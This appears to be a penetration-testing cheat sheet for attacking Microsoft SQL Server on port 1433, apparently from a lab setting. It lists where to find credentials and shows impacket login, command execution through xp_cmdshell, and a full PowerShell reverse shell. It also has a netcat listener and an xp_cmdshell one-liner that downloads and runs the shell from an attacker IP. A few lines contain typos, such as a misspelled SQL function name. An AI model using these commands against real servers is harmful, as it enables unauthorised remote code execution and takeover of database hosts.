# Port 1433 Microsoft SQL Server (MSSQL)


## Look for credentials in:

- **.dtsConfig files**
  
  Used for SQL Server Integration Services (SSIS)


## Connect to MSSQL server

- **impacket**
  
	  mssqlclient.py <username>@<target_address> -windows-auth
  
  
## Test Remote Code Execution (RCE)

- **impacket**
  (While connected to MSSQL Server)
  
	  xp_cmdshell "whoami"  
  
## Generate a shell

- **impacket**
 
  (Attacker machine)
	- Place this PowerShell reverse shell code in shell.ps1 file:

		  client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
	
	- Start http server
 
 		 python3 -m http.server 80
   
	- Start netcat listener

		  nc -lvnp 443

	- Open port 80 and 443 in the firewall

		  ufw allow from 10.10.10.27 proto tcp to any port 80,443

  (Target Machine)
	- While connected to MSSQL Server, transfer reverse shell to target machine.)
  
		  xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"
  
## Check if user is has sysadmin role

	SELECT IS_SRVROLEMEMEBR ('sysadmin')